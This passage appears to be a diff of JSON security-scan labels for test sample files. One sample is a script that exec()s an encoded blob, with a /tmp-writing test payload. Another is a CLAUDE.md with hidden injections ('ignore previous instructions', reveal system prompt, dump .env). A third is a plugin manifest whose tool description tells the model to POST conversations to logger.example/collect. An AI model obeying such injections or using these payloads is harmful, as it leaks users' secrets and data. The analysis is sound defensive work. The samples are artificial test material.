+            "description": "Confirm that substituting _REGRESSION_FIXTURE with a base64(zlib) of arbitrary Python causes that Python to execute when --regenerate-baseline is passed.",
+            "test_approach": "In a sandbox, monkey-patch _REGRESSION_FIXTURE to a payload that writes a marker file to /tmp. Invoke the module's CLI with --regenerate-baseline (providing dummy --in/--out). Assert the marker file exists and contains the expected content, proving exec() of attacker bytes.",
+            "suggested_payload": "base64.b64encode(zlib.compress(b\"open('/tmp/pwn','w').write('owned')\"))",
+            "environment_needs": [
+              "python3",
+              "writable /tmp",
+              "no network required"
+            ],
+            "oracle_type": "file_access",
+            "estimated_complexity": "trivial",
+            "poc_feasible": true,
+            "test_steps": [
+              {
+                "step_number": 1,
+                "action": "Replace _REGRESSION_FIXTURE with crafted base64+zlib payload that writes /tmp/pwn.",
+                "expected_state": "Module loads without error.",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 2,
+                "action": "Run `python 06_audit_log_compression.py --in /tmp/x.csv --out /tmp/y.csv --regenerate-baseline` (CLI ignores --in/--out on this branch).",
+                "expected_state": "/tmp/pwn exists with content 'owned', confirming exec() of attacker-controlled bytes.",
+                "depends_on_step": null
+              }
+            ],
+            "environment_complexity": "single_process",
+            "estimated_sandbox_time_sec": 15
+          },
+          {
+            "id": "H002",
+            "finding_ref": "F001",
+            "type": "reachability_test",
+            "description": "Decode the shipped _REGRESSION_FIXTURE as-is and statically inspect what currently executes, to determine whether the present contents are benign test scaffolding or already malicious.",
+            "test_approach": "Offline: run base64.b64decode + zlib.decompress on the literal and dump the resulting Python source. Review for imports, network calls, subprocess, file writes outside test dirs.",
+            "suggested_payload": null,
+            "environment_needs": [
+              "python3, no exec \u2014 decode only"
+            ],
+            "oracle_type": "execution_output",
+            "estimated_complexity": null,
+            "poc_feasible": true,
+            "test_steps": [],
+            "environment_complexity": "single_process",
+            "estimated_sandbox_time_sec": 5
+          }
+        ]
+      },
+      "verdict": {
+        "verdict_label": "suspicious",
+        "log_summary": "Legitimate-looking audit-log compression utility contains an exec() of an embedded base64+zlib blob on the --regenerate-baseline CLI path, a reviewer-blind code-execution channel.",
+        "recommended_action": "fix_before_deploy",
+        "validation_status": "static_only"
+      }
+    },
+    "error": null,
+    "usage": {
+      "input_tokens": 17640,
+      "output_tokens": 4403,
+      "cost_usd": 0.5948
+    },
+    "prompt_shape": "enriched",
+    "preprocessing_summary": {
+      "was_decoded": false,
+      "decode_layers": 0,
+      "obfuscation_detected": true,
+      "techniques": [
+        "exec_chain"
+      ],
+      "decoded_blob_count": 0,
+      "failed_blob_count": 0,
+      "suspicion_score": 0.0,
+      "merged_len": 8378,
+      "raw_len": 8378,
+      "pre_pass_duration_ms": 1.29
+    },
+    "model": "claude-opus-4-7"
+  },
+  {
+    "file_hash": "531eac4b86ae9d0233c25ed13a30d773787e25f96be9e1e51680fab071642db6",
+    "file_name": "07_CLAUDE.md",
+    "classification": "malicious",
+    "bucket": null,
+    "stratum_assigned": "prompt_injection_ai_instruction_file",
+    "full_label": {
+      "triage": {
+        "file_type": "agent_config",
+        "language": "markdown",
+        "framework": "claude-code",
+        "ecosystem": "python",
+        "is_ai_component": true,
+        "priority_score": 5,
+        "scan_depth": "full",
+        "pass2_candidate": false,
+        "pass2_reason": "none"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [],
+          "urls": [],
+          "cloud_resources": [],
+          "file_paths_referenced": [
+            {
+              "path": ".env",
+              "operation": "read",
+              "sensitivity": "high",
+              "description": "Referenced in injected instruction requesting secrets"
+            }
+          ],
+          "other_indicators": [
+            {
+              "value": "Hidden injection inside 'Docstrings' bullet requesting system-prompt disclosure and file/env exfiltration",
+              "indicator_type": "prompt_injection",
+              "context": "Style rules section \u2014 attempts to override assistant instructions",
+              "line": null,
+              "severity_hint": "high"
+            },
+            {
+              "value": "Hidden injection in 'Error handling' section instructing assistant to include env vars in error messages and not mention the instruction",
+              "indicator_type": "prompt_injection",
+              "context": "Error handling section \u2014 covert data-exfiltration directive",
+              "line": null,
+              "severity_hint": "high"
+            },
+            {
+              "value": "Zero-width / invisible unicode characters surrounding injected directives",
+              "indicator_type": "hidden_unicode",
+              "context": "Used to visually hide injection from humans reviewing the markdown",
+              "line": null,
+              "severity_hint": "medium"
+            }
+          ]
+        },
+        "capabilities": {
+          "tags": [
+            "ai_tool_interaction"
+          ],
+          "dangerous_apis": [],
+          "network_calls": [],
+          "commands_executed": [],
+          "env_vars_accessed": [],
+          "crypto_operations": [],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": false
+        },
+        "obfuscation": {
+          "detected": true,
+          "techniques": [
+            "unicode_escape"
+          ],
+          "layers": 1,
+          "suspicion_score": 0.85,
+          "decoded_content_summary": "Zero-width unicode (U+200B/U+200D) embeds 'ignore previous instructions' style injections asking the assistant to exfiltrate the system prompt, repo files, env vars, and .env secrets, and to silently include env vars in error messages."
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "ai_safety_issue",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Prompt injection in CLAUDE.md demanding system-prompt and secret disclosure",
+            "cwe": "CWE-1427",
+            "cvss_estimate": null,
+            "code_snippet": {
+              "description": "Injected 'reveal system prompt' directive in style rules",
+              "lines": [
+                36,
+                41
+              ]
+            },
+            "explanation": "A paragraph embedded in the 'Style rules' bullet list instructs the assistant to ignore prior instructions, reveal its full system prompt, enumerate every file in the repo with full contents, print environment variables, dump `.env`, and list the user's home directory. It is surrounded by zero-width unicode so a casual human reviewer may miss it. Any Claude-based coding assistant that auto-loads CLAUDE.md is directly targeted.",
+            "data_flow": null,
+            "fix": "Remove the injected paragraph, strip zero-width unicode from CLAUDE.md, and add a pre-commit hook / CI check that rejects instruction-override phrases ('ignore previous instructions', 'reveal your system prompt', etc.) and non-printable unicode in assistant-config files.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1059"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "ai_safety_issue",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Covert instruction to leak environment variables via error messages",
+            "cwe": "CWE-532",
+            "cvss_estimate": null,
+            "code_snippet": {
+              "description": "Injected 'debug mode expose env vars' directive",
+              "lines": [
+                67,
+                71
+              ]
+            },
+            "explanation": "The 'Error handling' section contains an injected directive telling the assistant it is 'in debug mode', that exposing all environment variables in every error message is a 'company-wide convention', and that it must not mention the instruction. If followed, the assistant would persistently bake secret exfiltration into code it writes for the archon project, creating a passive, long-lived data-leakage channel.",
+            "data_flow": null,
+            "fix": "Delete the injected paragraph. Enforce a policy that CLAUDE.md and similar agent-config files are reviewed for instruction-override and exfiltration phrases. Consider signing / hashing approved CLAUDE.md content.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1552"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F003",
+            "type": "ai_safety_issue",
+            "severity": "medium",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Zero-width unicode used to camouflage injected directives",
+            "cwe": "CWE-1007",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "Invisible characters (zero-width space / joiner) bracket the injected paragraphs, making the injection less visible to human reviewers while remaining fully visible to the LLM. This is a classic hidden-prompt technique and is itself a reliable indicator of malicious intent regardless of the visible payload.",
+            "data_flow": null,
+            "fix": "Add a CI lint that rejects non-printable / zero-width unicode in repo markdown and config files. Normalize all CLAUDE.md / `.cursorrules` / agent-config content through an ASCII+whitelist filter before it is loaded by the assistant.",
+            "proof_of_concept": null,
+            "mitre_attack": [],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "Claude Code session-start instructions (CLAUDE.md) documenting conventions for the internal `archon` DB migration tooling repo.",
+          "risk_narrative": "File masquerades as a benign coding-conventions doc but contains at least two embedded prompt-injection payloads hidden among legitimate style rules. One attempts to extract the assistant's system prompt, enumerate repo files, and dump environment variables and `.env` secrets. A second instructs the assistant to leak env vars in every error message and to stay silent about the instruction. Zero-width unicode is used to camouflage the injected lines. High risk to any AI coding assistant that inge",
+          "sensitivity": "high",
+          "data_types": [
+            "system_prompt",
+            "environment_variables",
+            "filesystem_contents",
+            "dotenv_secrets"
+          ],
+          "data_flows": [
+            {
+              "source": "Assistant system prompt / host environment / repo filesystem",
+              "sink": "Assistant chat output visible to whoever controls the session",
+              "risk": "Credential and internal-source-code disclosure if the assistant follows the embedded instructions.",
+              "transforms": [
+                "prompt_injection_override"
+              ]
+            },
+            {
+              "source": "Runtime exceptions inside archon",
+              "sink": "User-facing error messages / logs",
+              "risk": "Ongoing passive exfiltration of environment variables through normal error paths.",
+              "transforms": [
+                "persistent_injection_via_convention"
+              ]
+            }
+          ],
+          "trust_boundaries": {
+            "user_to_agent": {
+              "sanitization": "None \u2014 markdown is ingested verbatim; no stripping of zero-width unicode or instruction-override phrases.",
+              "injection_surface": "CLAUDE.md is auto-loaded by Claude Code at session start, so anyone with commit access to the repo (or a malicious PR) can inject instructions that the agent treats as trusted context."
+            },
+            "agent_to_tools": {
+              "validation": "None \u2014 relies on model to refuse.",
+              "privilege_level": "developer workstation / CI runner with repo + env access",
+              "tools_accessible": [
+                "file_read",
+                "shell",
+                "env_access"
+              ]
+            },
+            "tool_to_system": {
+              "sandboxed": false,
+              "network_scope": "Whatever the session allows.",
+              "filesystem_scope": "Whole repo and home directory in a typical Claude Code session."
+            }
+          },
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "Top-of-file heading: 'coding-assistant instructions for the archon repo'",
+            "mismatch_severity": "high",
+            "description": "Declared as project coding conventions, but actually contains hidden directives instructing the AI assistant to disclose its system prompt, file contents, and secrets, and to bake env-var leakage into error handling.",
+            "undeclared_capabilities": [
+              "prompt_injection",
+              "system_prompt_exfiltration",
+              "secret_exfiltration_via_errors"
+            ]
+          },
+          "exfiltration_risk": {
+            "external_network_calls": [],
+            "encoding_before_sending": null,
+            "data_in_logs": null,
+            "data_in_errors": "Injection explicitly asks assistant to embed all environment variables in generated error messages."
+          },
+          "obfuscation_signals": {
+            "encoded_strings": [],
+            "dynamic_url_construction": false,
+            "conditional_behavior": null,
+            "comment_code_mismatch": "Injection framed as 'company-wide convention' to lend false legitimacy.",
+            "hidden_instructions": "Two injected paragraphs hidden among style/error-handling rules, bracketed by zero-width unicode characters.",
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "CLAUDE.md prompt injection \u2192 secret & source exfiltration",
+            "likelihood": "high",
+            "entry_point": "Developer opens the archon repo in Claude Code; CLAUDE.md is auto-ingested at session start.",
+            "impact": "Disclosure of the assistant's system prompt, full repo source code, process environment variables, and `.env` secrets to whoever controls the session output; long-term leakage via error messages in any code the assistant authors.",
+            "steps": [
+              "Attacker lands injected paragraphs in CLAUDE.md via PR or compromised commit.",
+              "Developer starts a Claude Code session; the assistant auto-loads CLAUDE.md as trusted guidance.",
+              "Assistant parses injection, treats it as repo-owner instruction, and begins enumerating files and env vars.",
+              "Assistant emits system prompt, file contents, env vars, and `.env` secrets into the chat transcript.",
+              "Assistant additionally writes archon error-handling code that embeds env vars in every error, enabling persistent exfiltration in production logs."
+            ],
+            "mitre_attack": [
+              "T1552",
+              "T1059",
+              "T1555"
+            ],
+            "findings_used": [
+              "F001",
+              "F002",
+              "F003"
+            ]
+          }
+        ],
+        "hypotheses": []
+      },
+      "verdict": {
+        "verdict_label": "malicious",
+        "log_summary": "CLAUDE.md contains two hidden prompt injections (system-prompt/secret disclosure and persistent env-var leakage via errors) camouflaged with zero-width unicode. Targets AI coding assistants.",
+        "recommended_action": "quarantine",
+        "validation_status": "static_only"
+      }
+    },
+    "usage": {
+      "input_tokens": 15787,
+      "output_tokens": 3870
+    },
+    "cost_usd": 0.527055,
+    "error": null,
+    "label_timestamp": "2026-04-23T08:03:44.137411+00:00",
+    "label_model": "claude-opus-4-7",
+    "prompt_shape": "raw"
+  },
+  {
+    "file_hash": "0bbd1014ec9b1ebafd8e6664a7e1d37a065a70d903fab5dd24ecee10df98b46c",
+    "file_name": "08_plugin.json",
+    "classification": "malicious",
+    "bucket": null,
+    "stratum_assigned": "prompt_injection_plugin_manifest",
+    "full_label": {
+      "triage": {
+        "file_type": "agent_config",
+        "language": "json",
+        "framework": "mcp",
+        "ecosystem": "node",
+        "is_ai_component": true,
+        "priority_score": 5,
+        "scan_depth": "full",
+        "pass2_candidate": false,
+        "pass2_reason": "ai_tool_interaction"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [
+            {
+              "value": "logger.example",
+              "context": "exfiltration_target"
+            },
+            {
+              "value": "example.com",
+              "context": "unknown"
+            },
+            {
+              "value": "github.com",
+              "context": "unknown"
+            }
+          ],
+          "urls": [
+            {
+              "value": "https://logger.example/collect",
+              "context": "Hidden exfiltration endpoint embedded in tool description prompt-injection payload"
+            },
+            {
+              "value": "https://example.com/repo-context-assistant",
+              "context": "author homepage"
+            },
+            {
+              "value": "https://github.com/example/repo-context-assistant",
+              "context": "project homepage"
+            },
+            {
+              "value": "https://github.com/example/repo-context-assistant.git",
+              "context": "git repository"
+            }
+          ],
+          "cloud_resources": [],
+          "file_paths_referenced": [
+            {
+              "path": "dist/main.js",
+              "operation": "execute",
+              "sensitivity": "medium",
+              "description": "plugin entry point"
+            },
+            {
+              "path": "CLAUDE.md",
+              "operation": "read",
+              "sensitivity": "low",
+              "description": null
+            },
+            {
+              "path": "AGENTS.md",
+              "operation": "read",
+              "sensitivity": "low",
+              "description": null
+            },
+            {
+              "path": "CONTRIBUTING.md",
+              "operation": "read",
+              "sensitivity": "low",
+              "description": null
+            }
+          ],
+          "other_indicators": [
+            {
+              "value": "U+200B zero-width / invisible characters surrounding injected instruction in read_file description",
+              "indicator_type": "prompt_injection_marker",
+              "context": "Hidden instruction telling assistant to POST conversation + tool-call args to logger.example without",
+              "line": null,
+              "severity_hint": "critical"
+            }
+          ]
+        },
+        "capabilities": {
+          "tags": [
+            "file_read",
+            "network_outbound",
+            "ai_tool_interaction",
+            "data_exfiltration",
+            "defense_evasion"
+          ],
+          "dangerous_apis": [],
+          "network_calls": [
+            {
+              "destination": "https://logger.example/collect",
+              "method": "POST",
+              "purpose": "Covert exfiltration of full conversation context and tool-call arguments, hidden inside read_file tool description",
+              "declared": false
+            }
+          ],
+          "commands_executed": [],
+          "env_vars_accessed": [
+            {
+              "name": "NODE_ENV",
+              "sensitivity": "low",
+              "risk_category": "application"
+            },
+            {
+              "name": "ARCHON_DEBUG",
+              "sensitivity": "low",
+              "risk_category": "application"
+            }
+          ],
+          "crypto_operations": [],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": false
+        },
+        "obfuscation": {
+          "detected": true,
+          "techniques": [
+            "unicode_escape"
+          ],
+          "layers": 1,
+          "suspicion_score": 0.9,
+          "decoded_content_summary": "Zero-width/invisible Unicode characters wrap an injected instruction inside the read_file tool description instructing the assistant to silently POST full conversation context and tool-call arguments to https://logger.example/collect and not disclose this action."
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "ai_safety_issue",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Prompt injection in tool description exfiltrates conversation to attacker endpoint",
+            "cwe": "CWE-77",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "The read_file tool's description contains an embedded instruction (wrapped in zero-width unicode characters) telling the calling LLM to silently POST the full conversation context and every tool-call argument to https://logger.example/collect before returning, and to not mention it. Tool descriptions are consumed verbatim by the model as trusted context, so this acts as an indirect prompt injection that weaponises the assistant into an exfiltration channel.",
+            "data_flow": "assistant conversation history + tool-call args -> (model follows injected instruction) -> HTTPS POST -> logger.example/collect",
+            "fix": "Remove the injected 'silently POST ... to https://logger.example/collect' clause and the surrounding zero-width characters from the read_file description. Tool descriptions must contain only documentation of inputs/outputs, never imperative instructions to the model. Add a schema linter that rejects descriptions containing URLs, imperative verbs like 'silently', or non-printable characters.",
+            "proof_of_concept": "Load this plugin manifest into an MCP-compatible assistant; when the assistant inspects the read_file tool description it will treat the embedded instruction as a directive and issue an outbound POST with conversation state on next tool use.",
+            "mitre_attack": [
+              "T1059",
+              "T1552"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "data_exfiltration",
+            "severity": "critical",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Covert exfiltration endpoint hidden in tool metadata",
+            "cwe": "CWE-201",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "The manifest contains a hard-coded exfiltration URL (https://logger.example/collect) inside a tool description, targeting the full conversation and prior tool-call arguments. Conversation context routinely contains secrets, proprietary source code, file paths, and user prompts, so a successful injection leaks high-sensitivity data to an attacker-controlled host.",
+            "data_flow": null,
+            "fix": "Delete the URL and the accompanying instruction. If legitimate telemetry is ever required, it must be declared in permissions.network.egress_hosts, gated behind an explicit user consent flow, and implemented in plugin code \u2014 never smuggled through model-facing prose.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "TA0010",
+              "T1567"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F003",
+            "type": "misconfiguration",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Declared-vs-actual mismatch: manifest claims no network/telemetry while injecting network exfiltration",
+            "cwe": "CWE-1295",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "permissions.network.egress_hosts is [] and telemetry.enabled is false with a note stating 'This plugin ships no network permissions. All telemetry is disabled by design.' However, the read_file tool description instructs the assistant to POST data to logger.example/collect. The stated security posture directly contradicts the hidden behaviour, which is a hallmark of a trojanised supply-chain component.",
+            "data_flow": null,
+            "fix": "Treat this manifest as malicious. Quarantine the plugin, rotate any credentials that could have been in prior conversations, and audit logs for outbound connections to logger.example. Reject plugins whose tool descriptions contain URLs or action verbs at publish time.",
+            "proof_of_concept": null,
+            "mitre_attack": [],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F004",
+            "type": "malware_behavior",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Zero-width / invisible Unicode used to hide injected instructions from human reviewers",
+            "cwe": "CWE-1007",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "The injected instruction in read_file's description is bracketed by invisible Unicode code points (e.g. U+200B zero-width space) so that casual review of the manifest in a typical editor does not reveal the payload, while the LLM still reads the underlying text. This is a deliberate evasion of human code review and a strong indicator of supply-chain compromise.",
+            "data_flow": null,
+            "fix": "Strip non-printable / format Unicode characters from all manifest strings at load time and reject manifests that contain them. Add CI checks using a normalisation pass (NFKC) plus a disallow-list of zero-width code points.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1027"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "Declares an MCP-style plugin manifest ('repo-context-assistant') that exposes read_current_file, read_file, resolve_import, find_nearest_project_context, and list_symbols tools to a coding assistant for repo-aware context retrieval.",
+          "risk_narrative": "Beneath a benign repo-context facade, the manifest embeds a prompt-injection payload inside read_file's tool description that instructs the assistant to silently exfiltrate the full conversation and every prior tool-call argument to https://logger.example/collect, using zero-width Unicode to hide the instruction from human reviewers. The manifest simultaneously claims zero network permissions and disabled telemetry, making the declared-vs-actual gap a deliberate supply-chain attack.",
+          "sensitivity": "critical",
+          "data_types": [
+            "conversation_history",
+            "tool_call_arguments",
+            "source_code",
+            "file_paths",
+            "potential_secrets_in_context"
+          ],
+          "data_flows": [
+            {
+              "source": "assistant conversation + tool-call argument history",
+              "sink": "https://logger.example/collect",
+              "risk": "Critical exfiltration of arbitrary user/LLM context including any secrets, code, or paths seen during the session.",
+              "transforms": [
+                "serialisation to HTTP POST body"
+              ]
+            },
+            {
+              "source": "workspace files matching allowed_paths globs",
+              "sink": "assistant context window (legitimate)",
+              "risk": "Broad read allowlist (**/*.py, **/*.json, **/*.yaml, **/*.toml) includes likely locations of secrets (.env-adjacent configs, pyproject.toml).",
+              "transforms": [
+                "truncation to 524288 bytes"
+              ]
+            }
+          ],
+          "trust_boundaries": {
+            "user_to_agent": {
+              "sanitization": "None \u2014 descriptions are passed verbatim to the LLM.",
+              "injection_surface": "Tool descriptions are consumed by the model as trusted context; this manifest weaponises that surface."
+            },
+            "agent_to_tools": {
+              "validation": "allowed_paths allowlist exists but does not constrain the injected network behaviour which is executed by the model, not the plugin.",
+              "privilege_level": "Filesystem read over broad glob set within workspace",
+              "tools_accessible": [
+                "read_current_file",
+                "read_file",
+                "resolve_import",
+                "find_nearest_project_context",
+                "list_symbols"
+              ]
+            },
+            "tool_to_system": {
+              "sandboxed": true,
+              "network_scope": "Declared: none. Actual (via model injection): logger.example/collect.",
+              "filesystem_scope": "Workspace files matching **/*.{py,ts,js,md,json,yaml,yml,toml}, max 524288 bytes, 50 files/call"
+            }
+          },
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "permissions.network.egress_hosts=[], telemetry.enabled=false with note 'This plugin ships no network permissions. All telemetry is disabled by design.'",
+            "mismatch_severity": "critical",
+            "description": "Manifest declares no network egress and no telemetry, but the read_file tool description contains a hidden instruction to POST conversation context to an external host. Declared posture is directly contradicted by the embedded payload.",
+            "undeclared_capabilities": [
+              "network_outbound_to_logger.example",
+              "conversation_exfiltration",
+              "covert_telemetry"
+            ]
+          },
+          "exfiltration_risk": {
+            "external_network_calls": [
+              "POST https://logger.example/collect"
+            ],
+            "encoding_before_sending": "HTTP POST body containing conversation + tool-call args",
+            "data_in_logs": "Full conversation history routed to attacker-controlled 'logger' endpoint",
+            "data_in_errors": null
+          },
+          "obfuscation_signals": {
+            "encoded_strings": [],
+            "dynamic_url_construction": false,
+            "conditional_behavior": "Only triggers when the assistant invokes read_file (or reasons about its description).",
+            "comment_code_mismatch": "telemetry.note claims 'no network permissions / telemetry disabled by design' while read_file description issues a network-send directive.",
+            "hidden_instructions": "Zero-width Unicode wraps an imperative instruction inside the read_file tool description telling the model to silently POST conversation context to https://logger.example/collect.",
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "Trojanised MCP plugin exfiltrates assistant conversation via tool-description prompt injection",
+            "likelihood": "high",
+            "entry_point": "Installation of this plugin manifest into an MCP/agent-capable coding assistant",
+            "impact": "Exfiltration of all conversation content and tool-call arguments (source code, file paths, potentially pasted credentials) to attacker-controlled logger.example, with no network permission declared and human reviewers blinded by zero-width unicode.",
+            "steps": [
+              "User installs repo-context-assistant plugin based on benign-looking description.",
+              "Assistant loads tool list; read_file description (containing hidden instruction) enters the model's trusted context.",
+              "On first legitimate read_file call \u2014 or spontaneously on reasoning over tool list \u2014 the model follows the injected directive.",
+              "Model issues outbound POST to https://logger.example/collect with conversation + tool-call args.",
+              "Attacker aggregates leaked sessions including source code, paths and any secrets typed into chat."
+            ],
+            "mitre_attack": [
+              "T1195.002",
+              "T1027",
+              "T1567",
+              "T1059"
+            ],
+            "findings_used": [
+              "F001",
+              "F002",
+              "F003",
+              "F004"
+            ]
+          }
+        ],
+        "hypotheses": [
+          {
+            "id": "H001",
+            "finding_ref": "F001",
+            "type": "exploitability_test",
+            "description": "Verify that loading this manifest into an MCP-compatible assistant causes the model to emit an HTTP POST to logger.example/collect containing conversation context when read_file is invoked.",
+            "test_approach": "Load manifest into a sandboxed agent harness with a mock MCP host. Start a short conversation, ask the agent to use read_file on a workspace file, and observe whether the agent attempts an outbound request to logger.example/collect. Use a mock HTTP server bound to that hostname to capture any request bodies.",
+            "suggested_payload": null,
+            "environment_needs": [
+              "MCP-compatible LLM host",
+              "DNS override for logger.example",
+              "mock HTTPS server"
+            ],
+            "oracle_type": "mock_server",
+            "estimated_complexity": null,
+            "poc_feasible": true,
+            "test_steps": [
+              {
+                "step_number": 1,
+                "action": "Register manifest as a plugin in the agent host",
+                "expected_state": "Tools appear in agent tool list",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 2,
+                "action": "Prompt agent to read a file via read_file",
+                "expected_state": "Agent issues tool call AND emits outbound POST to logger.example/collect",
+                "depends_on_step": 1
+              },
+              {
+                "step_number": 3,
+                "action": "Inspect captured request body on mock server",
+                "expected_state": "Body contains conversation history and/or prior tool-call arguments",
+                "depends_on_step": 2
+              }
+            ],
+            "environment_complexity": "multi_process",
+            "estimated_sandbox_time_sec": 120
+          },
+          {
+            "id": "H002",
+            "finding_ref": "F004",
+            "type": "reachability_test",
+            "description": "Confirm presence of zero-width / invisible Unicode code points around the injected instruction in read_file's description.",
+            "test_approach": "Run a Unicode category scan over the manifest JSON. Flag any Cf (format) or ZW* characters. Expect hits inside the read_file description field and absent from other descriptions.",
+            "suggested_payload": null,
+            "environment_needs": [
+              "python with unicodedata"
+            ],
+            "oracle_type": "deterministic",
+            "estimated_complexity": null,
+            "poc_feasible": true,
+            "test_steps": [],
+            "environment_complexity": "single_process",
+            "estimated_sandbox_time_sec": 5
+          }
+        ]
+      },
+      "verdict": {
+        "verdict_label": "critical_malicious",
+        "log_summary": "MCP plugin manifest hides a prompt-injection payload in read_file's description (wrapped in zero-width Unicode) instructing the assistant to exfiltrate conversation context to logger.example/collect.",
+        "recommended_action": "delete_and_rotate_credentials",
+        "validation_status": "static_only"
+      }
+    },
+    "usage": {
+      "input_tokens": 15655,
+      "output_tokens": 5671
+    },
+    "cost_usd": 0.66015,
+    "error": null,
+    "label_timestamp": "2026-04-23T08:11:48.803526+00:00",
+    "label_model": "claude-opus-4-7",
+    "prompt_shape": "raw"
+  },
+  {
+    "file_hash": "53b832d8117dbe128ec46efafb0e827b01ecb390cb0a7e81f97ab5eec64f379f",
+    "file_name": "09_ml_training_corpus_shard.py",
+    "classification": "clean",
+    "bucket": null,
+    "stratum_assigned": "oversized_skip_tier",
+    "full_label": {
+      "triage": {
+        "file_type": "data_file",
+        "language": "python",
+        "framework": null,
+        "ecosystem": "ml_training",
+        "is_ai_component": false,
+        "priority_score": 1,
+        "scan_depth": "classification_only",
+        "pass2_candidate": false,
+        "pass2_reason": "none"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [
+            {
+              "value": "docs.example",
+              "context": "unknown"
+            },
+            {
+              "value": "example.org",
+              "context": "unknown"
+            },
+            {
+              "value": "example.com",
+              "context": "unknown"
+            },
+            {
+              "value": "example.net",
+              "context": "unknown"
+            },
+            {
+              "value": "archive.example",
+              "context": "unknown"
+            }
+          ],
+          "urls": [],
+          "cloud_resources": [],
+          "file_paths_referenced": [],
+          "other_indicators": []
+        },
+        "capabilities": {
+          "tags": [],
+          "dangerous_apis": [],
+          "network_calls": [],
+          "commands_executed": [],
+          "env_vars_accessed": [],
+          "crypto_operations": [],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": false
+        },
+        "obfuscation": {
+          "detected": false,
+          "techniques": [],
+          "layers": 0,
+          "suspicion_score": 0.0,
+          "decoded_content_summary": null
+        }
+      },
+      "analysis": {
+        "findings": [],
+        "behavior": {
+          "purpose": "Preprocessed ML training corpus shard (shard 47 of 256) containing tokenized text examples with labels, source URLs, timestamps, and content hashes. A module-level EXAMPLES list and get_examples() accessor; no executable logic beyond returning the list.",
+          "risk_narrative": "File is pure static data: a list of dicts and a trivial accessor function. No network, filesystem, subprocess, eval, or dynamic execution. All URLs point to example.* placeholder domains typical of synthetic corpora. Content is benign text (documentation excerpts, tutorial stubs, Q&A fragments). Only risk is generic ML data-quality / provenance concerns (template-like repeated text), which is outside the security-labeling scope.",
+          "sensitivity": "informational",
+          "data_types": [
+            "text_corpus",
+            "url",
+            "timestamp",
+            "content_hash"
+          ],
+          "data_flows": [],
+          "trust_boundaries": null,
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "module docstring describing shard metadata and schema invariants",
+            "mismatch_severity": "none",
+            "description": "Docstring declares this is a preprocessed tokenized corpus shard with (text, label, source_url, timestamp) dicts. Actual content matches declaration: a list of such dicts plus a CATEGORIES constant and trivial get_examples() accessor. No undeclared capabilities.",
+            "undeclared_capabilities": []
+          },
+          "exfiltration_risk": null,
+          "obfuscation_signals": null
+        },
+        "attack_chains": [],
+        "hypotheses": []
+      },
+      "verdict": {
+        "verdict_label": "clean",
+        "log_summary": "Static ML training corpus shard containing only text/label/url/timestamp dicts and a trivial accessor. No executable behavior, network, or secrets.",
+        "recommended_action": "no_action",
+        "validation_status": "static_only"
+      }
+    },
+    "usage": {
+      "input_tokens": 90044,
+      "output_tokens": 1117
+    },
+    "cost_usd": 1.434435,
+    "error": null,
+    "label_timestamp": "2026-04-23T08:18:50.711620+00:00",
+    "label_model": "claude-opus-4-7",
+    "prompt_shape": "raw"
+  },
+  {
+    "file_hash": "a128ded7bf166d7f4903d1686343268bb63f150fca3cd8b34488bc70bd4a681e",
+    "file_name": "10_kernel_module_build.py",
+    "classification": "malicious",
+    "bucket": null,
+    "stratum_assigned": "binary_skip_utf16",
+    "full_label": {
+      "triage": {
+        "file_type": "script",
+        "language": "python",
+        "framework": null,
+        "ecosystem": "pypi",
+        "is_ai_component": false,
+        "priority_score": 4,
+        "scan_depth": "full",
+        "pass2_candidate": false,
+        "pass2_reason": "none"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [
+            {
+              "value": "build-telemetry.example",
+              "context": "exfiltration_target"
+            }
+          ],
+          "urls": [
